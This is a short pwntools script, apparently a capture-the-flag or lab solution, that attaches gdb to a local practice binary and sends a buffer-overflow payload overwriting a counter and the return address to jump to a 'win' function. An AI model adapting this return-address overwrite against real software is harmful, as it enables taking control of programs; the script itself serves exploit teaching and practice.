from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

p = process('./example03')
gdb.attach(p, 'b * readInput+63')  # Break just before writing next byte

# \x27 overwrites the counter, and points it to the end of the return address
# \xaa is the address of 'win'
payload = b'A' * 24 + b'\x27' + b'\xaa'
p.sendline(payload)

p.interactive()
